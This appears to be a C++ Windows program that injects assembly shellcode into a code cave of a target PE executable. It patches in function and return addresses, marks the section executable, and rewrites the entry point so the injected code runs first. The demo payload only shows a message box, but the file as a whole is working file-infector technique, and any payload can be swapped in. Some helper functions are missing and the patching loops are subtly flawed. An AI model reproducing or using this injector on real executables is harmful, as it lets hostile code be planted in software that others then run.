// ConsoleApplication6.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#define Naked __declspec(naked)
static const char* szCaption = "Hello";
static const char* szText = "hai";
Naked void ShellcodeStart()
{
	_asm
	{
		pushad
			call    routine

		routine :
		pop     ebp
			sub     ebp, offset routine
			push    0                                // MB_OK
			lea     eax, [ebp + szCaption]
			push    eax                              // lpCaption
			lea     eax, [ebp + szText]
			push    eax                              // lpText
			push    0                                // hWnd
			mov     eax, 0xAAAAAAAA
			call    eax                              // MessageBoxA

			popad
			push    0xAAAAAAAA                       // OEP
			ret
	}
}
Naked void ShellcodeEnd(){

}
int _tmain(int argc, _TCHAR* argv[])
{
	if (argc < 2) {
		fprintf(stderr, "Usage: %s <TARGET FILE>\n", argv[0]);
		return 1;
	}

	HANDLE hFile = CreateFile(argv[1], FILE_READ_ACCESS | FILE_WRITE_ACCESS,
		0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	DWORD dwFileSize = GetFileSize(hFile, NULL);

	HANDLE hMapping = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, dwFileSize, NULL);

	LPBYTE lpFile = (LPBYTE)MapViewOfFile(hMapping, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, dwFileSize);
	// check if valid pe file
	if (VerifyDOS(GetDosHeader(lpFile)) == FALSE ||
		VerifyPE(GetPeHeader(lpFile)) == FALSE) {
		fprintf(stderr, "Not a valid PE file\n");
		return 1;
	}

	PIMAGE_NT_HEADERS pinh = GetPeHeader(lpFile);
	PIMAGE_SECTION_HEADER pish = GetLastSectionHeader(lpFile);

	// get original entry point
	DWORD dwOEP = pinh->OptionalHeader.AddressOfEntryPoint +
		pinh->OptionalHeader.ImageBase;

	DWORD dwShellcodeSize = (DWORD)ShellcodeEnd - (DWORD)ShellcodeStart;
	// find code cave
	DWORD dwCount = 0;
	DWORD dwPosition = 0;

	for (dwPosition = pish->PointerToRawData; dwPosition < dwFileSize; dwPosition++) {
		if (*(lpFile + dwPosition) == 0x00) {
			if (dwCount++ == dwShellcodeSize) {
	// backtrack to the beginning of the code cave
				dwPosition -= dwShellcodeSize;
				break;
			}
		}
		else {
	// reset counter if failed to find large enough cave
			dwCount = 0;
		}
	}

	// if failed to find suitable code cave
	if (dwCount == 0 || dwPosition == 0) {
		return 1;
	}
	// dynamically obtain address of function
	HMODULE hModule = LoadLibrary("user32.dll");

	LPVOID lpAddress = GetProcAddress(hModule, "MessageBoxA");

	// create buffer for shellcode
	HANDLE hHeap = HeapCreate(0, 0, dwShellcodeSize);

	LPVOID lpHeap = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwShellcodeSize);

	// move shellcode to buffer to modify
	memcpy(lpHeap, ShellcodeStart, dwShellcodeSize);
	// modify function address offset
	DWORD dwIncrementor = 0;
	for (; dwIncrementor < dwShellcodeSize; dwIncrementor++) {
		if (*((LPDWORD)lpHeap + dwIncrementor) == 0xAAAAAAAA) {
			// insert function's address
			*((LPDWORD)lpHeap + dwIncrementor) = (DWORD)lpAddress;
			FreeLibrary(hModule);
			break;
		}
	}

	// modify OEP address offset
	for (; dwIncrementor < dwShellcodeSize; dwIncrementor++) {
		if (*((LPDWORD)lpHeap + dwIncrementor) == 0xAAAAAAAA) {
			// insert OEP
			*((LPDWORD)lpHeap + dwIncrementor) = dwOEP;
			break;
		}
	}
	// copy the shellcode into code cave
	memcpy((LPBYTE)(lpFile + dwPosition), lpHeap, dwShellcodeSize);
	HeapFree(hHeap, 0, lpHeap);
	HeapDestroy(hHeap);

	// update PE file information
	pish->Misc.VirtualSize += dwShellcodeSize;
	// make section executable
	pish->Characteristics |= IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE;
	// set entry point
	// RVA = file offset + virtual offset - raw offset
	pinh->OptionalHeader.AddressOfEntryPoint = dwPosition + pish->VirtualAddress - pish->PointerToRawData;

	return 0;
}

